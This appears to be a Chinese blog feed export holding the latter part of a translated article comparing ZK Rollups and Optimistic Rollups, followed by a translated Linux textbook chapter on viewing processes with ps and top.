<p>因此可以在单个Rollup区块中将数千个交易捆绑在一起。尽管此方法的成本严格地呈线性增长（交易数量的O(n) ），但它在吞吐量上实际可提升100倍，因为CALLDATA比Layer 1存储和计算要便宜。</p>
<p>Rollup已经被Vitalik Buterin反复认可为其最喜欢的Layer 2可扩展性解决方案。根据如何确保状态转换的正确性，有两种Rollup方式：ZK Rollup和Optimistic Rollup。</p>
<ul>
<li>什么是ZK Rollup？</li>
</ul>
<p>在ZK-Rollup中，运营商必须为每个状态转换生成一个SNARK（蓝狐笔记：简洁非互动的知情证明，Succinct Non-interactive ARgument of Knowledge），并由主链上的Rollup合约进行验证。此SNARK证明存在一系列由所有者正确签名的交易，这些交易以正确的方式更新了账户余额，并使得Merkle root从旧到新。因此，运营商不可能提交无效或操纵的状态。</p>
<ul>
<li>什么是Optimistic Rollup？</li>
</ul>
<p>在Optimistic Rollup中，新状态根由运营商发布，且无需每次都由Rollup智能合约检查。相反，每个人都希望状态转换是正确的。但是，如果发布了不正确的状态转换，其他运营商或用户（必须观察在Layer 1 Rollup 合约中的情况，执行每个单笔交易）将能够指出错误的交易，并还原错误的区块，消减恶意运营商的押金。Optimistic Rollup的概念最初由John Adler提出的。</p>
<p>接下来，让我们比较一下ZK Rollup 和Optimsitc Rollup。</p>
<h4 id="灵活性：通用计算"><a href="#灵活性：通用计算" class="headerlink" title="灵活性：通用计算"></a>灵活性：通用计算</h4><ul>
<li>Optimistic Rollup</li>
</ul>
<p>尽管Optimistic Rollup可用于特定的应用，但是Plasma Group最重要的创新是OVM（Optimistic Vitual Machine）。OVM支持任意智能合约逻辑的实现。</p>
<p>几乎任何在以太坊上能实现的同样可以在OVM上实现，这其中包括智能合约的可组合性。它基于EVM，EWASM或任何其他虚拟机。关于OVM的好处是，如果它与EVM一起使用，它将支持用Solidity编写代码。因此，大部分现有的代码库都可以轻松移植到Optimistic Rollup上。</p>
<p>如果OVM可以直接重用现有的EVM字节码，那会是理想的选择，但这可能不是那么简单。正确的实现方式将要求更改交易数据（CALLDATA）格式，并要求复杂的Truebit&#x2F;Plasma Leap风格的挑战&#x2F;响应协议的实现，以提供欺诈证明。</p>
<p>这可能会导致与EVM产生分歧，从而导致无法正确处理边缘情况，这意味着仍然需要做一些工作才能适应当前的OVM合约。实施的另外一个挑战在于，大型区块的欺诈证明可能需要比Layer 1区块gas limit所允许的更多的gas。那么，这些欺诈证明必须被分解为多个ETH交易。</p>
<ul>
<li>ZK Rollup</li>
</ul>
<p>迄今为止，所有现有的ZK-Rollup实现聚焦于特定的操作，例如代币转移或原子交换。这其中有几个主要原因。</p>
<p>首先，没有一种有效的技术可用于针对不同ZKP的简洁递归证明组合，这需要将不同智能合约的执行汇总到一个区块中。我们最好的方法是在椭圆曲线的循环上使用Groth16（由Coda使用），这需要在较长的字段上进行计算，并且对于大型计算完全没有效率。</p>
<p>其次，即使我们的字段较短，Groth16也会为每个智能合约和每个新版本要求一个单独可信的设置仪式。显然，这绝对是不现实的。无须可信设置的唯一有效的ZKP技术是基于FRI的STARKs。但是，验证程序仅对有限的一类问题（可以表示为简洁的算术电路）是简洁的。</p>
<p>STARK验证程序必须对被证明的计算语句的每个约束至少执行一次，这意味着我们无法迭代异构智能合约的集合。</p>
<p>随着SNORKs的出现，一切都发生改变。SNORK是基于稍微不同的一组加密原语（著名的多项式承诺方案）的新一代ZKP。由Sean Bowe在Sonic中率先开发，在2019年夏季PLONK和Marlin紧跟其后。所有这些都有一个共同点：尽管依然需要可信设置，但现在它是通用且可更新的。完成一次之后，它可以随时将其重用于任何数量的不同程序。</p>
<p>然而，在这些证明系统中使用的Kate多项式承诺方案依然需要高效的椭圆曲线循环来进行递归，而目前尚不可用。这就是我们为什么对最新的完全简洁和透明（无可信设置）的证明系统感到兴奋，例如Halo、SuperSonic、Fractal，以及Matter Labs团队最近在折腾的让人兴奋的事情。</p>
<p>长话短说：在ZKP上构建通用智能合约的障碍现在已经被移除。ZK Rollup完全能够支持与EVM相同的编程模型，包括无缝可组合性和可互操作性。尽管Solidity开发者的学习曲线不会超过一天，但最初的合约可能需要专用的DSL。最终，鉴于ZKP证明者技术的当前发展步伐，我们期望所有的现存ETH（甚至EWASM）合约都能以最小的努力有效地移植过来。</p>
<h4 id="可扩展性-交易成本"><a href="#可扩展性-交易成本" class="headerlink" title="可扩展性&amp;交易成本"></a>可扩展性&amp;交易成本</h4><ul>
<li>Optimistic Rollup<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">根据<span class="keyword">John </span>Adler的说法，在<span class="keyword">EIP2028/伊斯坦布尔之后，目前的估算是每笔转账tx大约4k的gas。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">这意味着，相当于大约<span class="number">100</span>tps。</span><br><span class="line"></span><br><span class="line">使用<span class="keyword">BLS聚合签名，此数字最多可以上升到大约500tps（为了不破坏EVM兼容性，tx参数将可能会保留很长时间）。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">如果EVM兼容性遭到破坏，则理论上吞吐量可能会增长到ZKP的极限。</span><br></pre></td></tr></table></figure></li>
</ul>
<p>实际吞吐量上限（代币转移）：500tps</p>
<p>目前可能还不错。</p>
<ul>
<li>ZK Rollup</li>
</ul>
<p>在Matter Testnet中每笔转移tx的公共数据成本当前是16bytes，这将在EIP2028&#x2F;伊斯坦布尔后花费272gas费用。</p>
<p>此外，将会有证明的摊销费用，预计大约为30万gas。</p>
<p>即使我们假定最坏的情况，需要100万gas证明成本，但估算的转账上限仍将超过2140tps。</p>
<p>在一些讨论中，可以听到人们争论说ZKP会产生大量的计算开销，由此价格昂贵。实际上，与gas成本相比较，计算成本可以忽略不计，这是真正的瓶颈，因为抗审查的分散化。我们也期望这个因素会随时间的推移而显著下降。</p>
<p>实际吞吐量上限（代币转移）：超过2000tps —— 类似于Visa的规模。</p>
<p>但是，在许多用例中，ZK Rollup将节省更多，因为可以从公共数据中省略大块部分（通过将它们移至ZK电路证明），而无须重构状态转换增量。</p>
<p>核心见解是：尽管Optimistic Rollup始终要求用户发布完全的交易输入，而在ZK Rollup中，我们可以灵活地在如下两者间选择：1）交易输入减去不影响状态转换的见证人 2）仅交易输出。可以非常优雅地实现这一选择，而无须太多复杂性。</p>
<p>著名的例子：</p>
<pre><code>在多签钱包，具有Argent风格账户抽象的钱包或去中心化交易所，用户需要提交签名以获得合约的验证。这些签名对于状态增量更新是非必需的，可以从公开数据中省略。

像Gnosis的Dfusion Dutch DEX这样的合约要求大量的数据集输入，这些输入不会直接影响存储，但仅用于验证计算结果。
</code></pre>
<ul>
<li>ETH 2.0之后</li>
</ul>
<p>由于任何Rollup将位于单个分片中，因此，CALLDATA的成本（以及Rollup交易成本）不太可能发生很大的变化，除非带宽通常变得更便宜。</p>
<h4 id="元交易"><a href="#元交易" class="headerlink" title="元交易"></a>元交易</h4><p>两种类型的Rollup都非常适合支持元交易和账户抽象。</p>
<h4 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h4><ul>
<li>Optimistic Rollup</li>
</ul>
<p>与支付通道不同，Rollup中的所有资金都由单个智能合约持有。既然Rollup是最有希望的扩展方向，我们应该看到大量的用户迁移其中，且很多价值集中于这类合约。持有数千万上亿（甚至数十亿）美元价值的资产，对于知名黑客来说，Rollup合约正变成非常有吸引力的蜜罐，如果攻击有机会，那么，无论多么复杂，都有可能会尝试进行。</p>
<p>Optimistic Rollup的安全模型基于两个假设：</p>
<ol>
<li>至少在n个节点中有1个诚实节点执行所有Optimistic Rollup交易，并且在无效状态转换发布时提交欺诈证明；</li>
<li>底层Layer 1网络有强大的抗审查性</li>
</ol>
<ul>
<li>N个节点中至少有一个诚实节点参与者</li>
</ul>
<p>对于第一点，现实的期望是，只有Rollup的运营商才会实际监控和执行交易。普通用户既没有动力也没有技术能力来处理高负载的交易（如果他们可以，扩展来源于哪里？）幸运的是，运营商自然地有动力去检查彼此区块的正确性，因为基于无效区块上搭建区块会被消减资产。</p>
<p>有足够的可信参与者，N个节点中有1个诚实节点运营商是合理的假设。但是，既然活跃参与者的数量有限（几百个？），一些复杂的攻击可能包括：针对所有运营商的基础设施（非常困难但并非不可行），贿赂&#x2F;勒索开发工程师秘密安装恶意代码，针对Rollup软件的更新分发渠道等，当然，还可能是这些攻击的组合。</p>
<p>这些攻击很难实现，但应该积极防御，但比起用同样的方式攻击以太坊矿工，这些攻击要更加现实，尤其是因为对Optimistic Rollup的成功攻击直到完成后才会被注意到。</p>
<ul>
<li>强大的Layer 1抗审查性</li>
</ul>
<p>第二个假设是棘手的假设。实际上，以太坊的设计提供了经济机制，它对抗普通审查非常有效。但是，在出现反机制时，这些机制会停止起作用。攻击者可以创建完全自动的贿赂机制来协调矿工的51%攻击，这会阻止诚实矿工将欺诈证明包含在其区块中。</p>
<p>有趣的是，对于参与的矿工来说，此次攻击的直接成本为零，如果可以明确地归因于审查，则不计入由愤怒社区反应所产生的社会成本。这部分也很棘手，因为该机制为攻击的参与者提供了合理的可否认性：“鉴于攻击者多数的可信承诺，如果我不参与，我的区块会被抛弃，所以，我必须这么做，不是为了利润，而是为了避免损失。”</p>
<p>不幸的是，在PoW下，这种攻击非常现实。没有什么有效的方法来惩罚参与其中的匿名矿工。在转向PoS后，社区将可以通过消减矿工的质押权益来惩罚他们，如果达成广泛的社会共识。</p>
<p>毕竟，这样的审查攻击可以被视为对整个网络的侵略，尽管也可以说，矿工只是简单地诚实地遵循协议，且没有义务以违背其最佳经济利益方式行事。</p>
<p>但是，在DAO分叉后，至少可以说，这将是非常有争议的讨论，其结果无法预测。在Vitalik最近进行的一次社区民意测验中，无论遇到什么程度的攻击，63%的投票者反对对不可变的区块链进行任何人工干预来救助用户。不用说，要清除即使一个验证者的权益（蓝狐笔记：此处是指质押资金）也非常困难，更不用说清除大多数验证者的权益。</p>
<p>最近发布了更多关于串通合谋的研究，以及针对PoS环境中欺诈证明的新攻击，这表明在PoS中Optimistic Rollup的审查攻击风险至少与PoW一样高。</p>
<p>抵抗这种攻击的更现实的方法是在UASF（用户激活的软分叉）中社区的快速动员，以迫使矿工将某些交易包括进来。从工程和社会的角度看，这种场景都是复杂的，且将肯定要求相对长的挑战期窗口，以提供欺诈证明，至少一周，最好两周。</p>
<p>同时，鉴于主要的DeFi运营商在决定这种分叉的结果时处于有利位置，且避免吵闹的干扰事件符合其最大利益。所以，他们的最佳选择可能只是静静地遵循攻击者（这将使以太坊保持最长链，并产生比成功软分叉更少的争议）。</p>
<p>总的来说，欺诈证明审查的风险相对较低，但不可忽略。</p>
<p>由于存在1-2周的欺诈证明挑战期，并且没有太多资金的利害关系，Optimistic Rollup可能是没有问题的：运营商&#x2F;矿工合谋将不值得麻烦和冒风险。但是，如果rollup中的价值升高，潜伏的黑天鹅将会变得越来越让人担忧。</p>
<ul>
<li>ZK Rollup</li>
</ul>
<p>在ZK Rollup中，在其变为有效之前，每个状态转换都通过Rollup智能合约进行验证。严格来说，运营商无法盗取资金或破坏Rollup状态。ZK Rollup依赖于Layer 1的抗审查性，只是为了其活性，而不是为了安全性。无须任何人来监控ZK Rollup，在区块验证后，用户资金总是保证最终能被收回，即使运营商拒绝合作。</p>
<p>因此，ZK Rollup更充分地体现了加密世界的基本理念：通过密码学和博弈理论激励机制来取代可信方，以实现弹性。但是，为了完整起见，我必须提到ZK Rollup特有的一些潜在风险。</p>
<p>可信设置</p>
<p>如果在ZK Rollup中使用的ZKP需要通用的可信设置，则我们将得出“N分之一”诚实参与者的假设。根据参与者的数量和质量，这可能是可接受的风险，也可能是不可接受的风险。但安全是安全的，这就是为什么我对高效无须信任的SNARKs最新进展感到非常兴奋的原因，尤其是Matter Labs正在进行构建上。</p>
<h4 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h4><p>与Groth16相比，最新一代的SNARKs正在使用的是更多经过实践检验的加密原语。Matter Lab的工作基于FRI，因此甚至可以说是具有后量子的安全性。但是，要完全冷静下来，应该应用两种缓解策略：</p>
<ul>
<li><p>与RSA挑战类似，必须以比实际产品版本更低安全参数来部署大量奖金。如果发现了实际攻击，研究者会在产品代码被破坏数年前克服挑战。</p>
</li>
<li><p>所有状态转换必须仅由ZKR的运营商发送，而ZKR的运营商实质上充当双重验证的保护层。</p>
</li>
</ul>
<p>延迟（达成可验证最终性所需的时间）</p>
<ul>
<li>Optimistic Rollup</li>
</ul>
<p>由于上面安全性部分提到的问题，仅在1-2周欺诈证明的挑战窗口期内Optimistic Rollup才能是安全的。在这段时间过去之前，任何交易都不能认为是最终的，内部Rollup tx和退出都不是最终的。</p>
<p>不幸的是，对于最终用户来说，检查交易是否具有最终性，没有比通过整个上一次挑战期执行所有交易更快的方法了。需要特别注意的是，用户无法单纯依赖博弈理论来保证区块的最终性，因为单个运营商节点中的漏洞或（黑客入侵）仍可能导致还原。</p>
<p>最终性的时间（PoW下）：2周</p>
<p>最终性的时间（PoS下）：1周</p>
<ul>
<li>ZK Rollup</li>
</ul>
<p>当前ZKP计算上很密集。目前，对于1000tx的区块，我们可以在普通服务器硬件上有20分钟证明生成时间。正在进行的GPU证明程序实现（Matter Labs和Coda实施）有望将tx速度提高至少10倍。在不远的将来，专用硬件可能会拥有更高的计算能力。最终，我们期望看到在一分钟内完成区块的最终性。</p>
<p>最终性时间（现在）：20分钟</p>
<p>最终性时间（未来）：1分钟内</p>
<h4 id="Rollup交易内部的快速确认"><a href="#Rollup交易内部的快速确认" class="headerlink" title="Rollup交易内部的快速确认"></a>Rollup交易内部的快速确认</h4><p>在这两种类型的Rollup中，通过存入一定的安全保证金（如果交易没有包含进承诺的区块，保证金会被消减），运营商都可以向用户签发即时交易确认。这为最终性提供了经济保证。</p>
<p>这种方法有局限。它对于可互换代币的转移运转良好，但不适合于NFT和通用合约请求。该NFT可能没有市场价值，或者当这些资产的所有者不想在任何情况下立即“出售”它。通用合约请求不适用是因为如果链上的某些之前交易被还原，不容易准确量化货币价值。简单的例子：为接受稳定币预言机价格广播的最终价格，运营商应该质押多少资金合适？</p>
<h4 id="快速提取资金"><a href="#快速提取资金" class="headerlink" title="快速提取资金"></a>快速提取资金</h4><p>快速退出类似于快速内部Rollup确认。运营商可以与流动性提供商合作，以将可互换代币即时提取给用户，而无须等待退出交易在Rollup中成为具有最终性的交易。这要求大量的抵押品，这跟最终性达成的时间成正比。假设对Optimistic Rollup来说，不久将来的现实的最终性时间为1周，而ZK Rollup为5分钟，那么，Optimistic Rollup将需要2000倍于ZK Rollup的抵押品才能支持每周相同的提款量。</p>
<h4 id="隐私"><a href="#隐私" class="headerlink" title="隐私"></a>隐私</h4><ul>
<li>Optimistic Rollup</li>
</ul>
<p>Optimistic Rollup可以支持Layer 2以太坊 （混合器等）上的任何可用的隐私解决方案。既然Optimistic Rollup本身也是Layer 2，在其上实现的任何隐私解决方案将作为Layer 3。这可能导致隐私服务更加分散，并导致较小的匿名集，这使得隐私的实用性非常低（我们甚至可以在zcash上观察到，默认情况下交易不会隐藏）</p>
<ul>
<li>ZK Rollup</li>
</ul>
<p>为了获得真正的隐私，系统必须默认支持它。从技术的角度看，ZK Rollup可以在某种情况下默认轻松支持在协议层面代币转移的隐私交易，也可以区分公共和私人智能合约。</p>
<p>同时，构建完全匿名的zcash风格交易（即不仅隐藏金额，也隐藏交易的参与者），它将要求改变ZK Rollup的存储模型，从基于账户模型变为基于UTXO模型，这会产生很多问题，且不太可能发生。</p>
<h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><p>Optimistic Rollup目前处于PoC阶段。（蓝狐笔记：PoC是指概念证明阶段。从长远和落地角度，蓝狐笔记更看好ZK Rollup）我们希望很快会实现产品级实施。如果证明它移植现有代码相对容易，那么，项目将逐渐开始采用它并构建新的基础架构：Layer 2支持将在钱包中出现，预言机将开始广播到Optimistic Rollup等。</p>
<p>ZK Rollup在特定应用方面已经更加成熟（例如ERC20代币的转移），但会逐步向完全通用的智能合约方向发展。最终，移植任何基于EVM和WASM的智能合约到ZK Rollup也是可能的，在当前的技术发展速度下，这可能耗费数年时间即可完成。</p>
<p>对于这两种类型的Rollup，类似的基础设施改变会发生在钱包、预言机以及其他智能合约组件中。这要求大量的工作，随着更多项目对Layer 2 扩展技术感兴趣，这些工作会加速。既然Optimistic Rollup承诺比ZK Rollup更早实现通用化的基于EVM的智能合约，它将极大地推动社区采用Layer 2的动机。</p>
<p>对于用户和dApp，从一个Rollup跳到另外一个Rollup，将会比从ETH最初迁移到Layer 2更容易。桥接会让这一过程更加顺畅。由于这种切换的简易，这种解决方案在UX方面会取得显著优势，从长远看，很可能会成为唯一的赢家。</p>
<p>不管结果如何，这都会是非常重要且让人兴奋的发展。无论如何，最终的赢家都是以太坊社区。</p>
]]></content>
      <categories>
        <category>Blockchain</category>
      </categories>
  </entry>
  <entry>
    <title>进程</title>
    <url>/2024/03/10-processes/</url>
    <content><![CDATA[<h2 id="10-–-进程"><a href="#10-–-进程" class="headerlink" title="10 – 进程"></a>10 – 进程</h2><p>现代操作系统通常是<em>多任务</em>的，这意味着它们通过快速地从一个正在执行的程序切换到另一个程序来创造做多于一件事的假象。Linux 内核通过使用<em>进程</em>来管理这个。进程是 Linux 如何组织等待在 CPU 上执行的不同程序的方法。</p>
<p>有时，计算机可能会变得迟缓，或者某个应用程序会停止响应。在本章中，我们将查看命令行中可用的一些工具，让我们检查程序正在做什么以及如何终止表现不佳的进程。</p>
<span id="more"></span>

<p>本章将介绍以下命令：</p>
<ul>
<li><code>ps</code> – 报告当前进程的快照</li>
<li><code>top</code> – 显示任务</li>
<li><code>jobs</code> – 列出活动作业</li>
<li><code>bg</code> – 将作业放入后台</li>
<li><code>fg</code> – 将作业放入前台</li>
<li><code>kill</code> – 向进程发送信号</li>
<li><code>killall</code> – 按名称终止进程</li>
<li><code>shutdown</code> – 关闭或重新启动系统</li>
</ul>
<h3 id="进程的工作原理"><a href="#进程的工作原理" class="headerlink" title="进程的工作原理"></a>进程的工作原理</h3><p>当系统启动时，内核会启动一些自己的活动作为进程，并启动一个名为 init 的程序。init 反过来运行一系列称为<em>init 脚本</em>的 shell 脚本（位于 &#x2F;etc），这些脚本启动所有系统服务。这些服务中的许多都是作为<em>守护进程程序</em>实现的，这些程序只是在后台执行它们的任务，没有任何用户界面。因此，即使我们没有登录，系统也至少会忙于执行常规任务。</p>
<p>一个程序可以启动其他程序的事实在进程方案中表达为<em>父进程</em>产生一个<em>子进程</em>。</p>
<p>内核维护有关每个进程的信息，以帮助维持组织。例如，每个进程都被分配一个称为<em>进程 ID</em>（<em>PID</em>）的数字。PID 以升序分配，初始化始终获得 PID 1。内核还跟踪分配给每个进程的内存，以及进程恢复执行的准备情况。与文件一样，进程也有所有者、用户 ID、有效用户 ID 等。</p>
<h3 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h3><p>查看进程的最常用命令（有几个命令可以使用）是 <code>ps</code>。<code>ps</code> 程序有很多选项，但在其最简单的形式中，它的使用方式如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ps</span><br><span class="line"> PID TTY TIME CMD</span><br><span class="line"> 5198 pts/1 00:00:00 bash</span><br><span class="line">10129 pts/1 00:00:00 ps</span><br></pre></td></tr></table></figure>

<p>在此示例中的结果列出了两个进程，进程 5198 和进程 10129，分别是 <code>bash</code> 和 <code>ps</code>。如我们所见，默认情况下，<code>ps</code> 不会显示太多信息，只显示与当前终端会话相关的进程。要查看更多信息，我们需要添加一些选项，但在这样做之前，让我们查看 <code>ps</code> 产生的其他字段。TTY 是“电传打字机”的缩写，指的是进程的<em>控制终端</em>。Unix 在此显示了其年龄。TIME 字段是进程消耗的 CPU 时间。如我们所见，没有进程使计算机工作得很辛苦。</p>
<p>如果我们添加一个选项，可以更全面地了解系统正在做什么。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ps x</span><br><span class="line"> PID TTY STAT TIME COMMAND</span><br><span class="line"> 2799 ? Ssl 0:00 /usr/libexec/bonobo-activation-server –ac</span><br><span class="line"> 2820 ? Sl 0:01 /usr/libexec/evolution-data-server-1.10 --</span><br><span class="line">15647 ? Ss 0:00 /bin/sh /usr/bin/startkde</span><br><span class="line">15751 ? Ss 0:00 /usr/bin/ssh-agent /usr/bin/dbus-launch --</span><br><span class="line">15754 ? S 0:00 /usr/bin/dbus-launch --exit-with-session</span><br><span class="line">15755 ? Ss 0:01 /bin/dbus-daemon --fork --print-pid 4 –pr</span><br><span class="line">15774 ? Ss 0:02 /usr/bin/gpg-agent -s –daemon</span><br><span class="line">15793 ? S 0:00 start_kdeinit --new-startup +kcminit_start</span><br><span class="line">15794 ? Ss 0:00 kdeinit Running...</span><br><span class="line">15797 ? S 0:00 dcopserver –nosid</span><br><span class="line">and many more...</span><br></pre></td></tr></table></figure>

<p>添加“x”选项（注意没有前导破折号）告诉 <code>ps</code> 显示我们所有的进程，无论它们由哪个终端（如果有的话）控制。TTY 列中的“?”表示没有控制终端。使用此选项，我们看到了我们拥有的每个进程的列表。</p>
<p>由于系统运行了很多进程，<code>ps</code> 会产生一个长列表。通常可以将 <code>ps</code> 的输出导入到 <code>less</code> 中以便更容易查看。某些选项组合也会产生长输出行，因此最大化终端模拟器窗口可能也是个好主意。</p>
<p>输出中还添加了一个名为 STAT 的新列。STAT 是“状态”的缩写，显示进程的当前状态，如表 10-1 所示。</p>
<p><em>表 10-1：进程状态</em></p>
<table>
<thead>
<tr>
<th><strong>状态</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>R</td>
<td>运行中。这意味着进程正在运行或准备运行。</td>
</tr>
<tr>
<td>S</td>
<td>睡眠中。进程没有运行；相反，它正在等待事件，如按键或网络数据包。</td>
</tr>
<tr>
<td>D</td>
<td>无法中断的睡眠。进程正在等待如磁盘驱动器等的 I&#x2F;O。</td>
</tr>
<tr>
<td>T</td>
<td>已停止。进程已被指示停止。本章后面会进一步介绍。</td>
</tr>
<tr>
<td>Z</td>
<td>僵尸进程。这是一个已终止但尚未被其父进程清理的子进程。</td>
</tr>
<tr>
<td>&lt;</td>
<td>高优先级进程。可以赋予进程更高的重要性，使其在 CPU 上获得更多的时间。这种进程的特性称为<em>优先级</em>。具有高优先级的进程被认为不太<em>友好</em>，因为它占用了更多的 CPU 时间，为其他人留下的时间较少。</td>
</tr>
<tr>
<td>N</td>
<td>低优先级进程。具有低优先级（一个“友好”的进程）的进程只有在其他具有更高优先级的进程被服务后才会获得处理器时间。</td>
</tr>
</tbody></table>
<p>进程状态后面可能跟随其他字符。这些表示各种特殊的进程特性。有关更多详细信息，请参阅 <code>ps</code> 的 man 页面。</p>
<p>另一个流行的选项集是“aux”（没有前导破折号）。这将为我们提供更多信息。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ps aux</span><br><span class="line">USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND</span><br><span class="line">root 1 0.0 0.0 2136 644 ? Ss Mar05 0:31 init</span><br><span class="line">root 2 0.0 0.0 0 0 ? S&lt; Mar05 0:00 [kt]</span><br><span class="line">root 3 0.0 0.0 0 0 ? S&lt; Mar05 0:00 [mi]</span><br><span class="line">root 4 0.0 0.0 0 0 ? S&lt; Mar05 0:00 [ks]</span><br><span class="line">root 5 0.0 0.0 0 0 ? S&lt; Mar05 0:06 [wa]</span><br><span class="line">root 6 0.0 0.0 0 0 ? S&lt; Mar05 0:36 [ev]</span><br><span class="line">root 7 0.0 0.0 0 0 ? S&lt; Mar05 0:00 [kh]</span><br><span class="line">and many more...</span><br></pre></td></tr></table></figure>

<p>这组选项显示属于每个用户的进程。使用没有前导破折号的选项会以“BSD风格”行为调用该命令。Linux 版的 <code>ps</code> 可以模拟几种不同 Unix 实现中 <code>ps</code> 程序的行为。使用这些选项，我们得到了表 10-2 中显示的额外列。</p>
<p><em>表 10-2：BSD风格的 <code>ps</code> 列标题</em></p>
<table>
<thead>
<tr>
<th><strong>标题</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>USER</td>
<td>用户ID。这是进程的所有者。</td>
</tr>
<tr>
<td>%CPU</td>
<td>CPU使用率（百分比）。</td>
</tr>
<tr>
<td>%MEM</td>
<td>内存使用率（百分比）。</td>
</tr>
<tr>
<td>VSZ</td>
<td>虚拟内存大小。</td>
</tr>
<tr>
<td>RSS</td>
<td>驻留集大小。这是进程使用的物理内存（RAM）量，单位为千字节。</td>
</tr>
<tr>
<td>START</td>
<td>进程启动时间。对于超过24小时的值，会使用日期。</td>
</tr>
</tbody></table>
<h4 id="使用-top-动态查看进程"><a href="#使用-top-动态查看进程" class="headerlink" title="使用 top 动态查看进程"></a>使用 top 动态查看进程</h4><p>虽然 <code>ps</code> 命令可以显示机器正在执行的很多内容，但它只提供执行 <code>ps</code> 命令时机器状态的快照。为了看到机器活动的更动态视图，我们使用 <code>top</code> 命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ top</span><br></pre></td></tr></table></figure>

<p><code>top</code> 程序会持续更新（默认每三秒）地显示系统进程，按进程活动排序。名称 <em>top</em> 来源于这样一个事实，即 <code>top</code> 程序用于查看系统上的“顶部”进程。<code>top</code> 显示包含两部分：显示顶部的系统摘要，后跟按CPU活动排序的进程表：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">top - 14:59:20 up 6:30, 2 users, load average: 0.07, 0.02, 0.00</span><br><span class="line">Tasks: 109 total, 1 running, 106 sleeping, 0 stopped, 2 zombie</span><br><span class="line">Cpu(s): 0.7%us, 1.0%sy, 0.0%ni, 98.3%id, 0.0%wa, 0.0%hi, 0.0%si</span><br><span class="line">Mem: 319496k total, 314860k used, 4636k free, 19392k buff</span><br><span class="line">Swap: 875500k total, 149128k used, 726372k free, 114676k cach</span><br><span class="line"> PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND</span><br><span class="line"> 6244 me 39 19 31752 3124 2188 S 6.3 1.0 16:24.42 trackerd</span><br><span class="line">11071 me 20 0 2304 1092 840 R 1.3 0.3 0:00.14 top</span><br><span class="line"> 6180 me 20 0 2700 1100 772 S 0.7 0.3 0:03.66 dbus-dae</span><br><span class="line"> 6321 me 20 0 20944 7248 6560 S 0.7 2.3 2:51.38 multiloa</span><br><span class="line"> 4955 root 20 0 104m 9668 5776 S 0.3 3.0 2:19.39 Xorg</span><br><span class="line"> 1 root 20 0 2976 528 476 S 0.0 0.2 0:03.14 init</span><br><span class="line"> 2 root 15 -5 0 0 0 S 0.0 0.0 0:00.00 kthreadd</span><br><span class="line"> 3 root RT -5 0 0 0 S 0.0 0.0 0:00.00 migratio</span><br><span class="line"> 4 root 15 -5 0 0 0 S 0.0 0.0 0:00.72 ksoftirq</span><br><span class="line"> 5 root RT -5 0 0 0 S 0.0 0.0 0:00.04 watchdog</span><br><span class="line"> 6 root 15 -5 0 0 0 S 0.0 0.0 0:00.42 events/0</span><br><span class="line"> 7 root 15 -5 0 0 0 S 0.0 0.0 0:00.06 khelper</span><br><span class="line"> 41 root 15 -5 0 0 0 S 0.0 0.0 0:01.08 kblockd/</span><br><span class="line"> 67 root 15 -5 0 0 0 S 0.0 0.0 0:00.00 kseriod</span><br><span class="line"> 114 root 20 0 0 0 0 S 0.0 0.0 0:01.62 pdflush</span><br><span class="line"> 116 root 15 -5 0 0 0 S 0.0 0.0 0:02.44 kswapd0</span><br></pre></td></tr></table></figure>

<p>系统摘要包含了很多有用的信息。以下是一些概述：</p>
<p><em>表 10-3：top 信息字段</em></p>
<table>
<thead>
<tr>
<th><strong>行数</strong></th>
<th><strong>字段</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>top</td>
<td>程序的名称。</td>
</tr>
<tr>
<td></td>
<td>14:59:20</td>
<td>当前的时间。</td>
</tr>
<tr>
<td></td>
<td>up 6:30</td>
<td>这称为 <em>运行时间</em>（uptime）。这是自上次启动机器以来的时间。在此示例中，系统已经运行了六个半小时。</td>
</tr>
<tr>
<td>2 个用户</td>
<td>有两个用户登录。</td>
<td></td>
</tr>
<tr>
<td>负载平均值：</td>
<td><em>负载平均值</em> 是指等待运行的进程数，即处于可运行状态并共享 CPU 的进程数。显示三个值，每个值对应不同的时间段。第一个是过去60秒的平均值，接下来是过去5分钟和过去15分钟的平均值。小于1.0的值表示机器不忙。</td>
<td></td>
</tr>
<tr>
<td>2        任务：</td>
<td>这总结了进程的数量及其各种进程状态。</td>
<td></td>
</tr>
<tr>
<td>3        CPU(s)：</td>
<td>这一行描述了 CPU 正在执行的活动的性质。</td>
<td></td>
</tr>
<tr>
<td>0.7%us</td>
<td>0.7% 的 CPU 用于 <em>用户进程</em>，意味着内核外的进程。</td>
<td></td>
</tr>
<tr>
<td>1.0%sy</td>
<td>1.0% 的 CPU 用于 <em>系统</em>（内核）进程。</td>
<td></td>
</tr>
<tr>
<td>0.0%ni</td>
<td>0.0% 的 CPU 由“nice”（低优先级）进程使用。</td>
<td></td>
</tr>
<tr>
<td>98.3%id</td>
<td>98.3% 的 CPU 空闲。</td>
<td></td>
</tr>
<tr>
<td>0.0%wa</td>
<td>0.0% 的 CPU 等待 I&#x2F;O。</td>
<td></td>
</tr>
<tr>
<td>4        内存：</td>
<td>显示物理 RAM 的使用情况。</td>
<td></td>
</tr>
<tr>
<td>5        交换：</td>
<td>显示交换空间（虚拟内存）的使用情况。</td>
<td></td>
</tr>
</tbody></table>
<p>top程序接受许多键盘命令。最有趣的两个命令是h，它显示程序的帮助屏幕，和q，它退出top。</p>
